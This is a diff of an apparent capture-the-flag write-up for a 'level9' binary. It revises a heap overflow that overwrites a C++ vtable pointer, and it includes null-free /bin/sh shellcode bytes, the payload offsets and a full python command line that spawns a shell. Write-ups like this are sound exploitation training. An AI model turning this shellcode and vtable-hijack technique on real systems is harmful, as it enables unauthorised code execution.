@@ -32,36 +32,35 @@
    Distance from annotation buffer to obj2 vtable:
    0x804a078 - 0x804a00c = 0x6c = 108 bytes
    
-   Challenge: strlen() stops at null bytes, so we need:
-   - Null-byte-free shellcode
-   - Addresses without null bytes
+    Challenge: strlen() stops at null bytes, so we need:
+    - Null-byte-free shellcode
+    - Addresses without null bytes
+    
+    Solution:
+    - Use null-free shellcode from level2 (24 bytes, Exploit-DB #42428)
+      \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
+      \x50\x53\x89\xe1\xb0\x0b\xcd\x80
+      
+      See level2 documentation for detailed shellcode analysis.
    
-   Solution:
-   - Use null-free shellcode from Exploit-DB 42428 (24 bytes):
-     Author: Touhid M.Shaikh
-     Source: https://www.exploit-db.com/shellcodes/42428
-     
-     \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
-     \x50\x53\x89\xe1\xb0\x0b\xcd\x80
-   
-   - Place NOP sled + shellcode at start of annotation buffer
+   - Place shellcode at START of annotation buffer
+   - Fill rest with NOPs to reach obj2's vtable
    - Overflow to overwrite obj2's vtable with fake vtable address
    - Fake vtable points back to our shellcode location
    
    Payload structure:
-   [44 NOPs] + [24-byte shellcode] + [40 NOPs] + [fake_vtable_ptr] + [shellcode_addr]
+   [24-byte shellcode] + [84 NOPs] + [fake_vtable_ptr] + [shellcode_addr]
    
-   - Bytes 0-43: NOP sled (\x90 * 44)
-   - Bytes 44-67: Shellcode (24 bytes)
-   - Bytes 68-107: NOP padding (\x90 * 40)
+   - Bytes 0-23: Shellcode (24 bytes)
+   - Bytes 24-107: NOP padding (\x90 * 84)
    - Bytes 108-111: Fake vtable pointer = 0x0804a07c (\x7c\xa0\x04\x08)
-   - Bytes 112-115: Shellcode address = 0x0804a01c (\x1c\xa0\x04\x08)
+   - Bytes 112-115: Shellcode address = 0x0804a00c (\x0c\xa0\x04\x08)
    
-   The fake vtable at 0x0804a07c contains the address 0x0804a01c,
-   which points into our NOP sled, sliding into shellcode.
+   The fake vtable at 0x0804a07c contains the address 0x0804a00c,
+   which points to the start of our payload where shellcode is located.
 
 6. Execute the exploit:
-   ./level9 $(python -c 'print "\x90"*44 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*40 + "\x7c\xa0\x04\x08" + "\x1c\xa0\x04\x08"')
+   ./level9 $(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*84 + "\x7c\xa0\x04\x08" + "\x0c\xa0\x04\x08"')
    
    Shell spawned!
 
